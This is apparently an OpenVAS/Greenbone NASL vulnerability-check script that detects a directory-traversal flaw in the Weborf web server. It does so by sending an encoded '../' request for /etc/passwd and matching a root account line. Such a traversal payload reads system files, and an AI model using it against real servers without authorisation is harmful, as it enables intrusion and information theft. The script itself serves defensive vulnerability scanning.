if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100788" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-09-07 15:26:31 +0200 (Tue, 07 Sep 2010)" );
	script_bugtraq_id( 43016 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Weborf HTTP 'modURL()' Function Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/43016" );
	script_xref( name: "URL", value: "http://galileo.dmi.unict.it/wiki/weborf/doku.php?id=news:released_0.12.1" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_weborf_webserver_detect.sc", "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Weborf/banner" );
	script_tag( name: "summary", value: "Weborf is prone to a directory-traversal vulnerability because
it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary local
files within the context of the webserver. Information harvested may
aid in launching further attacks.

Weborf 0.12.2 and prior versions are vulnerable." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: Weborf" )){
	exit( 0 );
}
url = NASLString( "/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" );
if(http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

